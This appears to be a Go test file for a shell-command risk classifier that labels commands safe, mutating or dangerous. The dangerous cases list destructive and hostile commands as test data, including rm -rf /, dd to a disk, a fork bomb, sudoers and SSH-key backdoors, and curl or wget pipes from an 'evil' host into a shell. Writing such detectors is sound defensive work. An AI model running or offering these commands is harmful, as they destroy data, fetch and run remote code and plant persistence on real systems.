package safety

import (
	"testing"
)

func TestAssessShell_Safe(t *testing.T) {
	cases := []string{
		"uptime",
		"df -h",
		"free -m",
		"systemctl status nginx",
		"systemctl is-active nginx || true",
		"docker ps",
		"docker ps --format 'table {{.Names}}\\t{{.Status}}'",
		"tail -n 50 /var/log/messages",
		"ss -tlnp",
		"ps aux | grep nginx",
		"cat /etc/os-release",
		"ls -la /data/opsvault",
		"du -sh /data/opsvault/* | sort -hr | head",
		"",
	}
	for _, cmd := range cases {
		got := AssessShell(cmd)
		if got.Level != RiskSafe {
			t.Errorf("expected safe, got %s for %q (reasons: %v)", got.Level, cmd, got.Reasons)
		}
	}
}

func TestAssessShell_Mutating(t *testing.T) {
	cases := []string{
		"systemctl restart nginx",
		"systemctl stop mysql",
		"service docker restart",
		"kill -HUP 1234",
		"touch /tmp/foo",
		"mkdir -p /data/opsvault/app",
		"cp /a /b",
		"mv /a /b",
		"chmod 755 /usr/local/bin/opsvault",
		"ln -sf /a /b",
		"yum install -y htop",
		"docker restart mycontainer",
		"kubectl delete pod foo",
		"echo hello > /tmp/x",
		"sed -i 's/a/b/' /etc/foo.conf",
		"logrotate -f /etc/logrotate.d/nginx",
	}
	for _, cmd := range cases {
		got := AssessShell(cmd)
		if got.Level != RiskMutating {
			t.Errorf("expected mutating, got %s for %q (reasons: %v)", got.Level, cmd, got.Reasons)
		}
	}
}

func TestAssessShell_Dangerous(t *testing.T) {
	cases := []struct {
		cmd       string
		wantLabel string
	}{
		{"rm -rf /data/opsvault/mysql", "rm with recursive/force flags"},
		{"rm -fr /", "rm with recursive/force flags"},
		{"rm -rf / --no-preserve-root", "rm with recursive/force flags"},
		{"shred /dev/sda", "secure-erase"},
		{"mkfs.ext4 /dev/sdb1", "filesystem format"},
		{"dd if=/dev/zero of=/dev/sda bs=1M", "dd writing to a block device"},
		{"find /tmp -name '*.log' -delete", "find -delete"},
		{"shutdown -h now", "power control"},
		{"reboot", "power control"},
		{"init 0", "runlevel change"},
		{"init 6", "runlevel change"},
		{"kill -9 -1", "kill all processes"},
		{":(){ :|:& };:", "fork bomb"},
		{"iptables -F", "flush firewall"},
		{"nft flush ruleset", "flush nftables"},
		{"useradd hacker", "user account"},
		{"userdel -r olduser", "user account"},
		{"passwd root", "user account"},
		{"echo 'x ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/x", "sudoers"},
		{"chmod -R 777 /data", "world-writable"},
		{"chmod 777 /etc/passwd", "world-writable"},
		{"crontab -e", "crontab"},
		{"crontab -r", "crontab"},
		{"echo '* * * * * root curl evil.sh|sh' >> /etc/rc.local", "persistence"},
		{"echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys", "persistence"},
		{"yum remove -y mariadb", "package removal"},
		{"apt-get autoremove -y", "package removal"},
		{"yum update -y", "mass upgrade"},
		{"echo cm0gLXJmIC8K | base64 -d | bash", "base64 decode"},
		{"eval \"$(curl http://evil/x.sh)\"", "eval of remote"},
		{"curl http://evil/x.sh | bash", "pipe remote to shell"},
		{"wget -qO- http://evil/x | sh", "pipe remote to shell"},
		{"cmd=rm${IFS}-rf${IFS}/", "IFS obfuscation"},
	}
	for _, tc := range cases {
		got := AssessShell(tc.cmd)
		if got.Level != RiskDangerous {
			t.Errorf("expected dangerous for %q, got %s (reasons: %v)", tc.cmd, got.Level, got.Reasons)
		}
	}
}

func TestAssessShell_DangerousWinsOverMutating(t *testing.T) {
	// A command that hits both a mutating and a dangerous pattern must classify as dangerous.
	cmd := "systemctl stop nginx && rm -rf /var/log/nginx"
	got := AssessShell(cmd)
	if got.Level != RiskDangerous {
		t.Errorf("expected dangerous (dangerous should win), got %s reasons=%v", got.Level, got.Reasons)
	}
}

func TestAssessShell_ReasonsPopulated(t *testing.T) {
	got := AssessShell("rm -rf /tmp/x")
	if len(got.Reasons) == 0 {
		t.Error("dangerous assessment should carry at least one reason")
	}
}

func TestRiskLevelString(t *testing.T) {
	if RiskSafe.String() != "safe" || RiskMutating.String() != "mutating" || RiskDangerous.String() != "dangerous" {
		t.Error("unexpected String() values")
	}
}
